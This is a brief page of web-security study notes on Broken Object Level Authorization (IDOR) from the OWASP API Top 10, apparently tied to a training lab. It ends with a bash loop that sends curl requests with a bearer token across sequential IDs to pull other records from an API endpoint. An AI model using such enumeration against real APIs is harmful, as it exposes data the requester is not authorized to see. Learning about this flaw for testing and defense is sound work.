---
layout: default
title: API attacks
permalink: /Web/API/
---

# OWASP API Top 10 Security Risks using a RESTful web API

## Broken Object Level Authorization (BOLA)
Web APIs allow users to request data or records by sending various parameters, including unique identifiers such as Universally Unique Identifiers (UUIDs), also known as Globally Unique Identifiers (GUIDs), and integer IDs. Failing to properly verify that a user has permission to view a specific resource through object-level authorization mechanisms can lead to security vulnerabilities.
BOLA also known as an Insecure Direct Object Reference (IDOR) vulnerability.

Mass abuse BOLA from terminal:
```
for ((i=1; i<=20; i++)); do curl -X 'GET'   'http://94.237.59.225:40957/api/v1/supplier-companies/yearly-reports/'$i''   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbG<SNIP>' | jq; done
```
